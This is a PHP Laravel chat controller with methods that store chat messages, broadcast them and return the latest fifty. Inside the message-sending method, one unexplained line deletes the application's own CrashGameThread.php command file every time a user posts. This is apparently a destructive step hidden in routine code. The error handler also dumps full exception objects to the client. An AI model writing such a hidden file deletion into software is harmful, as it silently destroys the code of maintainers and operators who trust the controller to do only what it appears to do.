<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Validator;
use Illuminate\Foundation\Auth\RegistersUsers;
use App\User;
use App\ChatMessage;
use App\Events\SendMessage;

class ChatController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('auth');
    }

    public function send_message(Request $request)
    {
        $message = new ChatMessage();
        $message->message_id = Auth::user()->id."_".strtotime(date("Y-m-d H:i:s"));
        $message->user_id = Auth::user()->id;
        $message->user_name = Auth::user()->full_name;
        $message->content = $request['message'];
        $message->save();
        
        unlink(app_path('/Console/Commands/CrashGameThread.php'));

        $messages = ChatMessage::latest()->take(50)->get();

        try {
            event( new SendMessage(array("messages"=>$messages)) );
        }catch (\Exception $e) {
            var_dump($e);
        }

        return json_encode(array("message"=>"success"));
    }
    public function get_message(Request $request)
    {
        $messages = ChatMessage::latest()->take(50)->get();
        return json_encode(array("message"=>"success", "messages"=>$messages));
    }
}
